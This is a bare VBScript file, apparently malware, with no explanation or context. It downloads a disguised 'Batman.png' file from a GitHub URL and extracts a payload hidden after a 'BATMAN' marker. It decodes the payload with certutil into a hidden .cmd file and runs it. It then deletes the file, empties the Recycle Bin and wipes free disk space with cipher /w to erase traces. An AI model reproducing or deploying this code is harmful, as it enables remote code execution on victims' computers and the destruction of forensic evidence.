Dim myrand, newfle, rndfle

Set WshShell = CreateObject("WScript.Shell") 
myrand = rnd(0)
newfle = "%TEMP%\" & myrand & ".cmd"


Set fso - CreateObject("Scripting.FileSystemObject")
If fso.FileExists("%TEMP%\Batman.png") Then
	WScript.Sleep(5000)
Else
	WshShell.Run "%comspec% /c curl https://raw.githubusercontent.com/chrisuu11/BATMAN/main/code/gethostinfo --output %TEMP%\Batman.png", 0
	WScript.Sleep(5000)
End If

WshShell.Run "powershell.exe -command \"$f=Get-Content %TEMP%\Batman.png -Raw;($f -split \"BATMAN\")[-1].Trim()\" > %TEMP\log"
WshShell.Run "%comspec% /c certutil -decode %TEMP%\log " & newfle, 0
WScript.Sleep(5000)

WshShell.Run "%comspec% /c del %TEMP%\log", 0
WScript.Sleep(5000)

WshShell.Run newfle
WshShell.Run "%comspec% /c attrib +h +s " & newfle, 0
WScript.Sleep(180000)

myrand = rnd(0)
rndfle = "%TEMP%\" & myrand & ".tmp"

WshShell.Run "%comspec% /c attrib -h -s " & newfle, 0
WScript.Sleep(5000)
WshShell.Run "%comspec% /c rename " & newfle & " " & rndfle, 0
WScript.Sleep(5000)
WshShell.Run "%comspec% /c del " & rndfle, 0
WshShell.Run "%comspec% /c rd /s /q %systemdrive%\$Recycle.bin", 0
WshShell.Run "%comspec% /c cipher /w:C:", 0

Set WshShell = Nothing
